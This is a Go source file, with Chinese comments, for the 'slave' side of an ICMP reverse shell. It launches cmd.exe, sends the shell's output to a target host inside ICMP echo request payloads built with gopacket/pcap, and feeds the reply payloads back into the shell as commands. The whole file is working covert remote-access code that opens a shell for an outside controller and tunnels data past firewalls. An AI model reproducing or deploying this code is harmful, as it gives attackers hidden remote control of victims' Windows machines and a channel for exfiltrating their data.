package main

import (
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"net"
	"os/exec"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

const (
	DefaultDelay       = 200
	DefaultTimeout     = 3000
	DefaultMaxBlanks   = 10
	DefaultMaxDataSize = 64
)

type slaveConfig struct {
	target      string
	isTest      bool
	delay       int
	timeout     int
	maxBlanks   int
	maxDataSize int
}

func createShell() (stdin io.WriteCloser, stdout io.ReadCloser, err error) {
	cmd := exec.Command("cmd.exe")

	stdout, err = cmd.StdoutPipe()
	if err != nil {
		return nil, nil, err
	}
	cmd.Stderr = cmd.Stdout
	stdin, err = cmd.StdinPipe()
	if err != nil {
		return nil, nil, err
	}
	if err := cmd.Start(); err != nil {
		return nil, nil, err
	}
	return stdin, stdout, nil
}

func startPipeReader(outReader io.ReadCloser, outChan chan []byte, bufSize int) {
	if bufSize <= 0 {
		bufSize = DefaultMaxDataSize
	}
	buf := make([]byte, bufSize)
	for {
		n, err := outReader.Read(buf)
		if err != nil {
			close(outChan)
			return
		}
		if n > 0 {
			// 复制一份数据，避免下次 Read 覆盖底层数组导致 main goroutine 读到脏数据
			data := make([]byte, n)
			copy(data, buf[:n])
			outChan <- data
		}
	}
}

// getDefaultGateway 从路由表中解析默认网关 IP
func getDefaultGateway() (string, error) {
	cmd := exec.Command("cmd", "/c", "route print 0.0.0.0")
	out, err := cmd.Output()
	if err != nil {
		return "", err
	}
	lines := strings.Split(string(out), "\n")
	for _, line := range lines {
		fields := strings.Fields(line)
		if len(fields) >= 3 && fields[0] == "0.0.0.0" {
			return fields[2], nil // 第三个字段通常是网关 IP
		}
	}
	return "", errors.New("gateway not found")
}

// getMacByIP 从系统的 ARP 缓存表中解析指定 IP 的 MAC 地址
func getMacByIP(ip string) (net.HardwareAddr, error) {
	cmd := exec.Command("arp", "-a")
	out, _ := cmd.Output()
	lines := strings.Split(string(out), "\n")
	for _, line := range lines {
		fields := strings.Fields(line)
		// 必须至少有3个字段，且第一个字段严格等于目标IP
		if len(fields) < 2 {
			continue
		}
		if fields[0] != ip {
			continue
		}
		macStr := strings.ReplaceAll(fields[1], "-", ":")
		mac, err := net.ParseMAC(macStr)
		if err != nil {
			// 跳过解析失败的行，继续找
			continue
		}
		return mac, nil
	}
	return nil, errors.New("mac not found in arp cache for " + ip)
}

// getNextHopMAC 智能判断并获取下一跳（局域网目标或网关）的 MAC 地址
func getNextHopMAC(srcIP, dstIP net.IP) (net.HardwareAddr, error) {
	isLocal := false
	ifaces, _ := net.Interfaces()
	for _, i := range ifaces {
		addrs, _ := i.Addrs()
		for _, a := range addrs {
			if ipnet, ok := a.(*net.IPNet); ok {
				if ipnet.IP.Equal(srcIP) && ipnet.Contains(dstIP) {
					isLocal = true
					break
				}
			}
		}
	}
	targetIP := dstIP.String()
	if !isLocal { // 如果目标在外网，则查找默认网关
		gw, err := getDefaultGateway()
		if err != nil {
			return nil, err
		}
		targetIP = gw
	}
	// 神之一手：给目标或网关发一个 UDP 空连接，强行唤醒操作系统的 ARP 机制，确保 ARP 表里一定有它的 MAC
	conn, _ := net.Dial("udp", targetIP+":53")
	if conn != nil {
		conn.Close()
	}
	return getMacByIP(targetIP)
}

func sendICMP(dstIP string, data []byte, timeout int) ([]byte, error) {
	dst := net.ParseIP(dstIP)
	if dst == nil {
		return nil, fmt.Errorf("invalid destination ip: %s", dstIP)
	}

	// 获取源 IP：向目标IP的80端口发起UDP连接（仅用于获取本机出口IP，不会真正发送数据）
	conn, err := net.Dial("udp", dstIP+":80")
	if err != nil {
		return nil, fmt.Errorf("获取源IP失败: %v", err)
	}
	srcIP := conn.LocalAddr().(*net.UDPAddr).IP
	conn.Close()

	// 1. 自动获取本机源 MAC 地址 (SrcMAC)
	var srcMAC net.HardwareAddr
	ifaces, _ := net.Interfaces()
	for _, i := range ifaces {
		addrs, _ := i.Addrs()
		for _, a := range addrs {
			if ipnet, ok := a.(*net.IPNet); ok && ipnet.IP.Equal(srcIP) {
				srcMAC = i.HardwareAddr
				break
			}
		}
	}
	if len(srcMAC) == 0 {
		return nil, fmt.Errorf("无法找到源 IP %s 对应的 MAC 地址", srcIP)
	}
	// 2. 自动获取下一跳(网关或目标)的 MAC 地址 (DstMAC)
	dstMAC, err := getNextHopMAC(srcIP, dst)
	if err != nil {
		return nil, fmt.Errorf("自动获取目标 MAC 失败: %v", err)
	}
	// 找到对应的网卡并打开
	ifs, _ := pcap.FindAllDevs()
	var device string
	for _, iface := range ifs {
		for _, addr := range iface.Addresses {
			if addr.IP.Equal(srcIP) {
				device = iface.Name
				break
			}
		}
	}
	if device == "" {
		return nil, fmt.Errorf("无法找到源 IP %s 对应的抓包设备", srcIP)
	}
	handle, err := pcap.OpenLive(device, 65536, true, 100*time.Millisecond)
	if err != nil {
		return nil, fmt.Errorf("打开网卡失败: %v", err)
	}
	defer handle.Close()
	// 3. 构造以太网头部
	eth := &layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	icmp := &layers.ICMPv4{
		TypeCode: layers.CreateICMPv4TypeCode(layers.ICMPv4TypeEchoRequest, 0),
		Id:       1,
		Seq:      1,
	}
	ip := &layers.IPv4{
		SrcIP:    srcIP,
		DstIP:    dst,
		Protocol: layers.IPProtocolICMPv4,
		Version:  4,
		TTL:      64,
	}
	buffer := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	payload := gopacket.Payload(data)
	if err := gopacket.SerializeLayers(buffer, opts, eth, ip, icmp, payload); err != nil {
		return nil, fmt.Errorf("序列化 ICMP 包失败: %v", err)
	}
	if err := handle.WritePacketData(buffer.Bytes()); err != nil {
		return nil, fmt.Errorf("发送ICMP包失败: %v", err)
	}

	// 开始计时，等待接收回包
	start := time.Now()

	// 设置 BPF 过滤规则：仅接收目标 IP 的 ICMP Echo Reply (type 0)
	filter := fmt.Sprintf("icmp and host %s and icmp[0] == 0", dstIP)
	if err := handle.SetBPFFilter(filter); err != nil {
		return nil, fmt.Errorf("设置BPF过滤器失败: %v", err)
	}

	for {
		// 检查总耗时是否超过了设定的 Timeout
		if time.Since(start) > time.Duration(timeout)*time.Millisecond {
			return nil, fmt.Errorf("timeout")
		}
		// 从网卡读取下一个抓到的包（BPF已过滤，只收到目标IP的ICMP Echo Reply）
		data, _, err := handle.ReadPacketData()
		if err != nil {
			continue
		}
		// 4. 解析收到的包
		packet := gopacket.NewPacket(data, layers.LayerTypeEthernet, gopacket.Default)

		// 提取 ICMP 层
		if icmpLayer := packet.Layer(layers.LayerTypeICMPv4); icmpLayer != nil {
			reply := icmpLayer.(*layers.ICMPv4)

			// 严格校验：确保这是针对我们刚才发出请求的回应
			if reply.Id == 1 && reply.Seq == 1 {
				// 成功拿到回包数据！
				return reply.Payload, nil
			}
		}
	}
}

func runSlave(cfg slaveConfig) error {
	if cfg.target == "" {
		return errors.New("slave requires -t")
	}

	fmt.Printf("启动配置 -> Target: %s, Delay: %d, TestMode: %v\n", cfg.target, cfg.delay, cfg.isTest)
	stdin, stdout, err := createShell()
	if err != nil {
		return fmt.Errorf("createShell error: %w", err)
	}
	defer stdin.Close()
	defer stdout.Close()

	outChan := make(chan []byte, 100)

	go startPipeReader(stdout, outChan, cfg.maxDataSize)
	for {
		//从cmd读取输出
		var outBuf []byte
		select {
		case data := <-outChan:
			outBuf = data
		default:
			outBuf = nil
		}
		// 只在有数据时才打印，避免 nil 转 string 产生乱码
		if outBuf != nil {
			fmt.Println(string(outBuf))
		}

		replyData, err := sendICMP(cfg.target, outBuf, cfg.timeout)
		if err != nil {
			fmt.Println("sendICMP error:", err)
		} else if len(replyData) > 0 {
			fmt.Printf("%s\n", hex.Dump(replyData))
			fmt.Println("------", string(replyData))
			stdin.Write(replyData)
			stdin.Write([]byte("\r\n"))
		}

		time.Sleep(time.Duration(cfg.delay) * time.Millisecond)
	}

	return nil
}
